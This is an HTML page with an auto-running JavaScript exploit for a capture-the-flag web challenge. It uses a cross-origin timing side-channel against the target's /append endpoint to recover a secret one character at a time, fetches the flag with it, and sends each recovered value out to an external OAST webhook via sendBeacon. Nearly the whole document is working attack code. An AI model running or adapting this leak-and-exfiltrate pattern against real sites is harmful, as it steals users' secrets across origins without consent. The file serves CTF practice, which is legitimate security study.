<!DOCTYPE html>
<html>
<head>
    <title>APPEND NOTE SOLVER - Status Oracle</title>
    <style>
        body { background: #0d1117; color: #58a6ff; font-family: 'Fira Code', monospace; padding: 20px; }
        .log-entry { border-left: 2px solid #30363d; padding-left: 10px; margin: 5px 0; font-size: 12px; }
        .success { color: #3fb950; font-weight: bold; }
        .error { color: #f85149; }
        .info { color: #58a6ff; }
    </style>
</head>
<body>
    <h2 id="status">INITIALIZING...</h2>
    <div id="log"></div>
<script>
    const TARGET = "https://append-note-61jaz.instancer.lac.tf";
    const WEBHOOK = "https://bbote0qi0v6t4dwpqhu8c71o2s8i31shs.oast.site";
    const CHARS = "0123456789abcdef";
    
    const log = (msg, cls="info") => {
        const div = document.createElement("div");
        div.className = "log-entry " + cls;
        div.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
        document.getElementById("log").prepend(div);
        console.log(msg);
    };
    
    const report = (data) => {
        const payload = JSON.stringify(data);
        log(`ğŸ“¡ Reporting: ${payload.substring(0, 100)}...`);
        navigator.sendBeacon(`${WEBHOOK}/${encodeURIComponent(payload)}`);
    };
    
    // Detect HTTP status via script loading (200 vs 404)
    async function testStatus(content) {
        const url = `${TARGET}/append?content=${encodeURIComponent(content)}&url=${TARGET}/`;
        
        return new Promise((resolve) => {
            const script = document.createElement('script');
            let resolved = false;
            
            const cleanup = (result) => {
                if (!resolved) {
                    resolved = true;
                    if (script.parentNode) {
                        document.body.removeChild(script);
                    }
                    resolve(result);
                }
            };
            
            // 200 response - will try to execute as JS and likely error
            script.onerror = () => cleanup('200_or_error');
            
            // If it somehow loads successfully
            script.onload = () => cleanup('200_loaded');
            
            // Timeout fallback
            setTimeout(() => cleanup('timeout'), 1500);
            
            document.body.appendChild(script);
            script.src = url;
        });
    }
    
    // Better oracle: use fetch and measure timing with Resource Timing API
    async function probeTiming(content, rounds = 5) {
        const url = `${TARGET}/append?content=${encodeURIComponent(content)}&url=${TARGET}/`;
        let times = [];
        
        for (let i = 0; i < rounds; i++) {
            const t0 = performance.now();
            
            try {
                // Use img tag for cross-origin timing
                await new Promise((resolve, reject) => {
                    const img = new Image();
                    const timeout = setTimeout(() => {
                        img.src = '';
                        resolve();
                    }, 800);
                    
                    img.onload = img.onerror = () => {
                        clearTimeout(timeout);
                        resolve();
                    };
                    
                    img.src = url + `&_=${Date.now()}_${i}`; // Cache bust
                });
            } catch(e) {}
            
            const elapsed = performance.now() - t0;
            times.push(elapsed);
            
            // Small delay between attempts
            await new Promise(r => setTimeout(r, 100));
        }
        
        // Remove outliers and average
        times.sort((a, b) => a - b);
        const trimmed = times.slice(1, -1); // Remove min and max
        const avg = trimmed.reduce((a, b) => a + b, 0) / trimmed.length;
        const variance = Math.sqrt(trimmed.reduce((sum, t) => sum + Math.pow(t - avg, 2), 0) / trimmed.length);
        
        return { avg, variance, times, trimmed };
    }
    
    async function solve() {
        log("ğŸš€ Starting attack...", "success");
        report({ status: "started", target: TARGET });
        
        // Calibrate baseline with multiple invalid prefixes
        log("ğŸ“Š Calibrating baseline (this takes ~30 seconds)...");
        const baselines = [];
        for (let i = 0; i < 3; i++) {
            const result = await probeTiming("INVALID_" + Math.random().toString(36), 5);
            baselines.push(result.avg);
            log(`  Baseline ${i+1}: ${result.avg.toFixed(1)}ms Â±${result.variance.toFixed(1)}ms`);
        }
        const baseline = baselines.reduce((a, b) => a + b) / baselines.length;
        log(`âœ“ Baseline established: ${baseline.toFixed(1)}ms`, "success");
        
        let secret = "";
        
        for (let pos = 0; pos < 8; pos++) {
            log(`\n${"=".repeat(50)}`);
            log(`ğŸ” CRACKING POSITION ${pos + 1}/8`, "success");
            log(`${"=".repeat(50)}`);
            
            let results = [];
            
            for (const c of CHARS) {
                const attempt = secret + c;
                const result = await probeTiming(attempt, 5);
                const delta = baseline - result.avg;
                const confidence = delta / result.variance; // Signal-to-noise ratio
                
                results.push({ 
                    char: c, 
                    avg: result.avg, 
                    variance: result.variance,
                    delta, 
                    confidence,
                    times: result.times 
                });
                
                const indicator = delta > 5 ? "ğŸ”¥" : delta > 2 ? "âš¡" : "  ";
                log(`  ${indicator} '${c}': ${result.avg.toFixed(1)}ms (Î” ${delta > 0 ? '+' : ''}${delta.toFixed(1)}ms, Ïƒ ${result.variance.toFixed(1)}, conf ${confidence.toFixed(2)})`);
            }
            
            // Sort by confidence (signal-to-noise)
            results.sort((a, b) => b.confidence - a.confidence);
            
            const winner = results[0];
            const runnerUp = results[1];
            
            secret += winner.char;
            
            log(`\nâœ… SELECTED: '${winner.char}' (Î”+${winner.delta.toFixed(1)}ms, confidence ${winner.confidence.toFixed(2)})`, "success");
            log(`   Runner-up: '${runnerUp.char}' (Î”+${runnerUp.delta.toFixed(1)}ms, confidence ${runnerUp.confidence.toFixed(2)})`);
            log(`   Current secret: ${secret}`, "success");
            
            report({
                position: pos,
                char: winner.char,
                secret: secret,
                delta: winner.delta.toFixed(2),
                confidence: winner.confidence.toFixed(2),
                top5: results.slice(0, 5).map(r => ({
                    c: r.char, 
                    d: r.delta.toFixed(1),
                    conf: r.confidence.toFixed(2)
                }))
            });
        }
        
        log(`\n${"=".repeat(50)}`);
        log(`ğŸ¯ FINAL SECRET: ${secret}`, "success");
        log(`${"=".repeat(50)}`);
        
        // Attempt to retrieve flag
        await new Promise(r => setTimeout(r, 1000));
        
        try {
            log("ğŸ´ Attempting flag retrieval...");
            const flagUrl = `${TARGET}/flag?secret=${encodeURIComponent(secret)}`;
            const res = await fetch(flagUrl);
            const flag = await res.text();
            const status = res.status;
            
            log(`Response [${status}]: ${flag}`);
            
            if (flag.startsWith('lactf{')) {
                log(`\nğŸ‰ğŸ‰ğŸ‰ FLAG CAPTURED: ${flag} ğŸ‰ğŸ‰ğŸ‰`, "success");
                document.getElementById("status").textContent = `âœ… ${flag}`;
                report({ secret, flag, status, success: true });
            } else {
                log(`âŒ Wrong secret - got: "${flag}"`, "error");
                document.getElementById("status").textContent = `âŒ Failed: ${flag}`;
                report({ secret, response: flag, status, success: false });
            }
        } catch(e) {
            log(`âŒ Error fetching flag: ${e}`, "error");
            report({ secret, error: e.toString() });
        }
    }
    
    // Start after brief delay
    setTimeout(solve, 1000);
</script>
</body>
</html>
